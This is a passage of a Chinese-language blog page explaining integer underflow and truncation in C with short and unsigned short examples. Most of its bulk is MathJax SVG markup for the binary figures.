-81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(1000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(1500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(2000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(2500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(3000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(3500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(4000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(4500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(5000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(5500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(6000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(6500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(7000,0)"></path></g><g data-mml-node="msub" transform="translate(7889,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mn" transform="translate(422,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>，再加1，等于$$(-11111111111100)<em>2<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="4.525ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 2000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">即</text></g></g></g></svg></mjx-container>(-32764)</em>{10}$$；</li>
</ul>
</li>
</ul>
</li>
</ul>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210209195841.png" style="zoom:25%;">

<h2 id="下溢"><a href="#下溢" class="headerlink" title="下溢"></a>下溢</h2><p>一个整数通过运算(赋值)，低于它能表示的下限，则会变成一个很大的数；</p>
<ul>
<li>  由于无符号整数不能识别负数(无符号整数类型接收一个负数会变成一个大正数)，因此一个short类型的变量<code>b=-4</code>赋给unsigned short类型的变量a时，<code>a=65532</code>；</li>
<li>  这是因为-4是负数，在计算机中以补码形式存储，-4的补码为<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="30.304ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 13394.2 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(389,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="msub" transform="translate(1667,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(3123.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(4179.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(4568.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(1000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(1500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(2000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(2500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(3000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(3500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(4000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(4500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(5000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(5500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(6000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(6500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(7000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(7500,0)"></path></g><g data-mml-node="msub" transform="translate(12568.7,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mn" transform="translate(422,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>，而由于unsigned short数据类型的首位不表示符号位，所有位全部用来表示数据，因此b $$ = (1111111111111100)<em>2 = (65532)</em>{10}$$；</li>
</ul>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210209200725.png" style="zoom:25%;">

<h2 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h2><p>将数据放入了比它本身小的存储空间中，从而出现了溢出，例如：短整型接收整型时只能接收低16位)；</p>
<ul>
<li>  一个int类型的变量<code>a=65537</code>赋给short类型的变量b时，<code>b=1</code>；</li>
<li>  这是因为short类型的空间是16位，<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="34.2ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 15116.2 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1000,0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(1500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(2000,0)"></path></g><g data-mml-node="msub" transform="translate(2889,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(4345.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(5401.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(5790.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(2000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(2500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(3000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(3500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(4000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(4500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(5000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(5500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(6000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 